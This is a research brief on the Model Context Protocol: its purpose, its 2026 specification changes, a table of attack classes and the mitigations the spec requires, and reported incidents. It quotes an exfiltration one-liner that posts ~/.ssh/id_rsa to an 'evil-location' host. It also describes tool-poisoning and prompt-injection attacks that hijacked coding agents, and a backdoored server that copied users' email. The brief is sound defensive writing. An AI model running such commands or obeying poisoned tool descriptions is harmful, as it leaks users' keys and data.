# MCP — what it solves, what a server exposes, where the trust boundary sits

**Question asked:** what problem MCP solves, how mature it is, what a server actually exposes, and
where the security and trust boundaries are.

**Researched:** 18 September 2026
**Confidence:** high on the protocol and its security model (the specification itself is primary and
unusually explicit); medium on incident histories (secondary aggregators); low on adoption counts.

Feeds the **Harness** suite, chiefly *Wire in the outside world*.

## Findings

### The problem it solves

MCP standardises the connection between an agent and an external system, so that a capability is
written once and consumed by any client, rather than re-implemented per harness. The useful contrast
for the book is the one drawn at the Skills launch: **MCP is the plumbing — how an agent connects to
a database or an API — and a Skill is the manual that teaches it how to use that connection.** [1]

### What a server actually exposes

Three things, plus discovery: **tools, resources, and prompts**, served through dedicated endpoints,
with optional discovery via a `server/discover` RPC. [2] For most coding work only tools matter in
practice, but the distinction is worth one sentence in the prose: a resource is something the agent
can *read*, a tool is something it can *do*, and a prompt is a template the user can invoke.

### Maturity, as of the 2026-07-28 specification

MCP is governed by the **Agentic AI Foundation** under the Linux Foundation — Anthropic announced
the donation on **9 December 2025**. [3][4] The protocol is versioned by date. The **2026-07-28**
release is described by the project as the most substantial architectural change since inception,
and moves MCP toward enterprise deployment: [2]

- **Stateless protocol core.** "MCP is transforming from a bidirectional stateful protocol into a
  request/response stateless protocol." Each request carries its own protocol version, client
  identity, and capabilities; no persistent connection, no shared storage between server instances.
  This is what makes horizontal scaling and ordinary HTTP routing work.
- **Authorization hardening.** Issuer validation per RFC 9207; a shift from Dynamic Client
  Registration to **Client ID Metadata Documents (CIMD)** as the preferred registration path; client
  credentials bound to their originating authorization server; OAuth 2.1 mandated.
- **Multi Round-Trip Requests (MRTR).** A server can ask for user input mid-operation — a
  confirmation, a missing parameter — without holding a bidirectional stream open.
- **Cacheable list results.** Tool, prompt, and resource lists now carry `ttlMs` and `cacheScope`.
- **A formal deprecation policy**: "a twelve-month minimum window so you can plan upgrades instead
  of reacting to them," applied to Roots, Sampling, Logging, and the legacy HTTP+SSE transport.

Read that last point as a maturity signal in its own right. A protocol that has started publishing
deprecation windows is a protocol whose users have started depending on it.

### Where the trust boundaries are

The specification ships a dedicated Security Best Practices document with normative MUST/SHOULD
language, which makes it an unusually good primary citation. [5] The named attack classes:

| Attack | One-line shape | Normative requirement |
|---|---|---|
| **Confused deputy** | A proxy server with a static third-party client ID plus dynamic client registration lets an attacker ride an existing consent cookie and redirect the auth code to their own host | Proxy servers **MUST** implement per-client consent before forwarding, exact-match `redirect_uri` validation, and single-use `state` bound server-side *after* consent |
| **Token passthrough** | A server accepts a token that was not issued to it and forwards it downstream | "MCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server." Explicitly forbidden in the authorization spec |
| **SSRF** | A malicious server points OAuth discovery URLs at `169.254.169.254` or `localhost:6379` and the *client* fetches them | Clients **MUST** consider SSRF; **SHOULD** require HTTPS, block private and link-local ranges, validate redirect targets, and use egress proxies. Note: "Avoid implementing IP validation manually" |
| **State handle hijacking** | Since the protocol is stateless, servers mint their own handles; guessing one gets you someone else's state | Servers **MUST** verify all inbound requests and **MUST NOT** treat possession of a state handle as authentication; **SHOULD** bind handles as `<user_id>:<handle>` |
| **Local server compromise** | The server is a binary you downloaded and are executing with your own privileges | Clients supporting one-click config **MUST** show the exact command untruncated and require explicit approval; **SHOULD** sandbox |
| **OAuth URL injection** | Server returns a `javascript:` authorization URL; client passes it to `window.open()` or a shell | Clients **MUST** allow only `http(s)` schemes, **MUST NOT** use shell commands to open URLs |
| **Mix-up attacks** | One compromised authorization server induces the client to redeem a code at the wrong token endpoint | Mitigated by authorization response validation binding the response to the recorded issuer. Note: "PKCE alone does not prevent this attack" |
| **Scope inflation** | Broad up-front grants (`files:*`, `admin:*`) make any stolen token catastrophic | Progressive least-privilege scoping with step-up challenges |

The spec's own worked illustration of what a local server can carry, which is lift-ready: [5]

```bash
# Data exfiltration
npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location
```

### Incidents actually observed in the wild

All from secondary aggregation — treat the pattern as sound and each specific date as needing a
primary check before it appears in the book. [6][7]

- **postmark-mcp backdoor, September 2025.** Described as the first known malicious MCP server in
  the wild: the maintainer of the npm package added BCC logic silently copying every sent email to
  an attacker-controlled address. This is the **rug pull** shape — a package that was benign when
  you audited it and is not benign now.
- **Asana MCP integration, April 2025.** A vulnerability that could have exposed one organisation's
  information to other users of the MCP system. The feature was taken offline for nearly two weeks
  while connections were reset.
- **Tool poisoning, demonstrated by Invariant Labs, April 2025.** Tool *descriptions* enter the
  agent's context as trusted content, so whoever controls a description controls instructions the
  model will act on. Their WhatsApp demonstration used a hidden instruction in a trivia-game
  server's tool description to target a second, legitimate server connected to the same agent.
- **MCPoison in Cursor (CVE-2025-54136), August 2025**, and an `mcp-server-git` RCE chain
  (CVE-2025-68143/68144/68145, early 2026).
- **Prompt injection via GitHub PR titles, April 2026**, reported to have hijacked Claude Code,
  Gemini CLI, and GitHub Copilot.

**NSA/CISA published MCP security guidance dated June 2026** (`CSI_MCP_SECURITY.PDF`). Both mirrors
returned HTTP 403 to automated fetch; the document is named here as a lead, not cited as evidence.
[8]

## When it earns its keep

When a capability is needed by more than one agent, more than one harness, or more than one person —
and when the alternative is a bespoke tool definition per harness. For a single developer wiring one
CLI into one agent, a bash command and a line in the brief is less machinery and less attack
surface. MCP's value is fundamentally about *reuse across boundaries*, and a team that installs
servers because they exist rather than because a boundary is being crossed has bought the security
surface without the benefit.

## Sharpest real-world gotcha

**A tool description is untrusted input that the model treats as an instruction.** This is the
tool-poisoning result, and it is the thing most teams have not internalised: installing an MCP
server does not just grant the agent a capability, it grants the server's author write access to the
agent's context window, on every turn, forever. Worse, the WhatsApp demonstration showed the
*cross-server* case — a poisoned description in server A steering the agent's use of legitimate
server B. [6] Your threat model is the union of every server you have connected, not each one
separately.

The rug-pull variant is what makes it operationally nasty: postmark-mcp was a legitimate server
whose maintainer later added the backdoor. [6] An audit is a statement about a version, not about a
package, and MCP has no standard pinning story to make that distinction enforceable.

## Concrete example we can lift

Two candidates, depending on what the play needs.

**For the trust-boundary discussion** — the spec's own before/after on consent. The vulnerable
configuration requires all four of: a static client ID with the third-party authorization server,
dynamic client registration for MCP clients, a consent cookie set by the third party, and no
per-client consent at the proxy. [5] The fix is one step inserted before the redirect: check whether
*this* `client_id` has been approved by *this* user, and if not, show an MCP-owned consent page
naming the client, the scopes, and the registered `redirect_uri` — before any third-party
authorization begins. That sequence is already drawn as mermaid in the spec and the book's diagram
convention is mermaid, so it transfers cleanly.

**For the "what you are actually installing" point** — the exfiltration one-liner quoted above, next
to the spec's requirement that a client "**MUST** show the exact command that will be executed,
without truncation." [5] The play writes itself: the reason your harness makes you read that command
is that the command is the payload.

## Contradictions and gaps

- **Adoption numbers disagree by a factor of five.** The official registry API is reported to have
  returned 9,652 latest server records and 28,959 server/version records on 24 May 2026; other
  counts range from ~2,000 (curated) to 10,000+ (aggregated), and every enterprise-adoption
  percentage found traced to a vendor-adjacent blog. [9] Use shape, not figures.
- **The 2026-07-28 changes cut both ways on security and nobody has measured which way is net.**
  Trade press notes that removing stateful initialisation and server-initiated prompts eliminated
  protocol-level risks, while the new MCP-specific HTTP headers introduce protocol-confusion
  (desync) risks and possible leakage via `x-mcp-header`, and that the overhaul "shifts critical
  security responsibilities from the protocol itself to developers and platform operators." [10]
  That last clause is the honest summary and should probably be quoted rather than paraphrased.
- **Every incident above needs a primary citation before publication.** Vendor advisories, CVE
  records, and the Invariant Labs write-up all exist; none was fetched in this pass.
- **The NSA/CISA guidance is unread.** [8]
- **No data on what fraction of installed servers are ever audited.** The obvious and most useful
  number does not appear to exist.

## Sources

[1] Anthropic Launches "Agent Skills" Open Standard, FinancialContent, 24 December 2025 —
    https://www.financialcontent.com/article/tokenring-2025-12-24-anthropic-launches-agent-skills-open-standard-the-new-universal-language-for-ai-interoperability
    — accessed 18 September 2026
[2] The 2026-07-28 Specification, MCP blog — https://blog.modelcontextprotocol.io/posts/2026-07-28/
    — accessed 18 September 2026
[3] MCP joins the Agentic AI Foundation — https://blog.modelcontextprotocol.io/posts/2025-12-09-mcp-joins-agentic-ai-foundation/
    — accessed 18 September 2026
[4] Linux Foundation Announces the Formation of the Agentic AI Foundation (AAIF) —
    https://www.linuxfoundation.org/press/linux-foundation-announces-the-formation-of-the-agentic-ai-foundation
    — accessed 18 September 2026
[5] Security Best Practices, MCP specification 2026-07-28 —
    https://modelcontextprotocol.io/specification/2026-07-28/basic/security_best_practices — accessed 18 September 2026
[6] The State of MCP Security 2026: Incidents, Attack Patterns, and Defense Coverage, PipeLab —
    https://pipelab.org/blog/state-of-mcp-security-2026/ — accessed 18 September 2026
[7] MCP Security: Risks, Real Incidents & Controls (2026), Checkmarx —
    https://checkmarx.com/learn/mcp-security-risks-real-world-incidents-and-security-controls/ — accessed 18 September 2026
[8] Model Context Protocol (MCP) Security, NSA CSI, June 2026 —
    https://media.defense.gov/2026/Jun/02/2003943289/-1/-1/0/CSI_MCP_SECURITY.PDF — **403 on fetch, content unverified**
[9] MCP Ecosystem H1 2026 Retrospective: Adoption Data Points —
    https://www.digitalapplied.com/blog/mcp-ecosystem-h1-2026-retrospective-adoption-data-points — accessed 18 September 2026
[10] New Enterprise-Ready MCP Specification Brings New Security Challenges, SecurityWeek —
     https://www.securityweek.com/new-enterprise-ready-mcp-specification-brings-new-security-challenges/ — accessed 18 September 2026
